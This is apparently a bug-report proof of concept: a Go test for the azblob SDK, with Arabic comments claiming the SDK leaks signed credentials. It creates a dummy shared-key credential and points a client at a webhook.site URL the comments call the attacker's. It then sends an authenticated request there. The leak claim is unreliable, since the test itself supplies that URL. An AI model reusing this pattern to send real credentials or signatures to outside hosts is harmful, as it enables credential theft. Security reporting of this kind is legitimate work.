package azblob

import (
    "context"
    "testing"
)

// هذه الدالة تثبت أن الـ SDK يسرب التوقيعات الرقمية لسيرفر خارجي
func TestImpact_RemoteCredentialLeakage(t *testing.T) {
    // الرابط الخارجي الذي نتحكم به (الهاكر)
    attackerURL := "https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835"

    // بيانات وهمية (Account Name و Key)
    // الـ SDK سيقوم بتوقيعها وإرسال التوقيع للرابط أعلاه
    cred, _ := NewSharedKeyCredential("leak_victim", "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg==")

    // إنشاء الـ Client بالرابط الخبيث
    client, _ := NewClientWithSharedKeyCredential(attackerURL, cred, nil)

    // استدعاء أي دالة تجبر الـ SDK على إرسال طلب موثق (Authenticated Request)
    pager := client.NewListContainersPager(nil)
    _, _ = pager.NextPage(context.TODO())
}
